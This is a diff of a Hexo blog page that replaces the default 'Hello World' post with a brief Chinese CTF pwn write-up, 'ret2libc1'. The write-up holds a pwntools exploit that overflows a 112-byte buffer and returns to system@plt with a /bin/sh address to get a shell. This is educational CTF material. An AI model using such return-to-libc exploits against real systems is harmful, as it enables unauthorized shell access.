@@ -4,9 +4,18 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Hello World, 微凉">
+    <meta name="keywords" content="ret2libc1, 微凉">
     <meta name="description" content="
-Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using He">
+checksec
+
+运行
+
+拖入IDA分析
+通过ALT+T
+可以发现system和bin/sh
+
+exp
+ 1 from pwn import *                                              ">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -18,7 +27,7 @@ Welcome to Hexo! This is your very first post. Check documentation for more info
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Hello World | 微凉</title>
+    <title>ret2libc1 | 微凉</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -205,12 +214,12 @@ Welcome to Hexo! This is your very first post. Check documentation for more info
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Hello World</h1>
+                    <h1 class="description center-align post-title">ret2libc1</h1>
                 </div>
             </div>
         </div>
@@ -324,12 +333,29 @@ Welcome to Hexo! This is your very first post. Check documentation for more info
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/pwn/">
+                                <span class="chip bg-color">pwn</span>
+                            </a>
+                        
+                            <a href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/">
+                                <span class="chip bg-color">二进制</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/pwn/" class="post-category">
+                                pwn
+                            </a>
+                        
+                    </div>
                     
                 </div>
             </div>
@@ -338,7 +364,7 @@ Welcome to Hexo! This is your very first post. Check documentation for more info
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-11-30
+                    2022-01-11
                 </div>
                 
 
@@ -347,7 +373,7 @@ Welcome to Hexo! This is your very first post. Check documentation for more info
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    73
+                    86
                 </div>
                 
 
@@ -372,20 +398,37 @@ Welcome to Hexo! This is your very first post. Check documentation for more info
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p><img src="/2021/11/30/hello-world/1.png" alt="hello"></p>
-<p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new "My New Post"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+                <ul>
+<li><p>checksec</p>
+<img src="/2022/01/11/ret2libc1/checksec.png" alt="image-20220111154452445" style="zoom:80%;"></li>
+<li><p>运行</p>
+<img src="/2022/01/11/ret2libc1/run.png" alt="image-20220111184726541" style="zoom:80%;"></li>
+<li><p>拖入IDA分析</p>
+<p>通过ALT+T</p>
+<p>可以发现system和bin/sh</p>
+</li>
+<li><p>exp</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"> 1 from pwn import *                                                           
+ 2 log_level = 'debug'
+ 3 elf = ELF("./ret2libc1")
+ 4  
+ 5 local = 1
+ 6  
+ 7 if local:
+ 8     r = process("./ret2libc1")
+ 9 else:
+10     r = remote("")
+11 bin_sh = 0x08048720
+12 system_addr = 0x08048611
+13 system_plt = 0x08048460
+14 # payload = b'a'*112 + p32(system_addr) + p32(bin_sh)
+15 payload = flat(['a'*112,p32(system_plt),'b'*4,p32(bin_sh)])
+16  
+17 r.sendline(payload)
+18  
+19 r.interactive()
+  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ul>
 
                 
             </div>
@@ -412,7 +455,7 @@ Welcome to Hexo! This is your very first post. Check documentation for more info
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://breeze-666.github.io/2021/11/30/hello-world/">https://breeze-666.github.io/2021/11/30/hello-world/</a>
+                    <a href="https://breeze-666.github.io/2022/01/11/ret2libc1/">https://breeze-666.github.io/2022/01/11/ret2libc1/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -449,7 +492,15 @@ Welcome to Hexo! This is your very first post. Check documentation for more info
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/pwn/">
+                                    <span class="chip bg-color">pwn</span>
+                                </a>
+                            
+                                <a href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/">
+                                    <span class="chip bg-color">二进制</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -493,17 +544,18 @@ Welcome to Hexo! This is your very first post. Check documentation for more info
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/01/10/defcon-2015-r0pbaby/">
+                <a href="/2022/01/11/ret2libc1/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="Defcon-2015-r0pbaby">
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="ret2libc1">
                         
-                        <span class="card-title">Defcon-2015-r0pbaby</span>
+                        <span class="card-title">ret2libc1</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -513,9 +565,63 @@ Welcome to Hexo! This is your very first post. Check documentation for more info
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-01-10
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-01-11
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/pwn/" class="post-category">
+                                    pwn
+                                </a>
+                            
+                            
                         </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/pwn/">
+                        <span class="chip bg-color">pwn</span>
+                    </a>
+                    
+                    <a href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/">
+                        <span class="chip bg-color">二进制</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/01/11/ret2syscall/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="ret2syscall">
+                        
+                        <span class="card-title">ret2syscall</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-01-11
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -540,44 +646,6 @@ Welcome to Hexo! This is your very first post. Check documentation for more info
                     </a>
                     
                 </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
-            </div>
-            <div class="card">
-                <a href="/2021/11/30/hello-world/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="Hello World">
-                        
-                        <span class="card-title">Hello World</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-11-30
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            breeze-666
-                            
-                        </span>
-                    </div>
-                </div>
-
                 
             </div>
         </div>
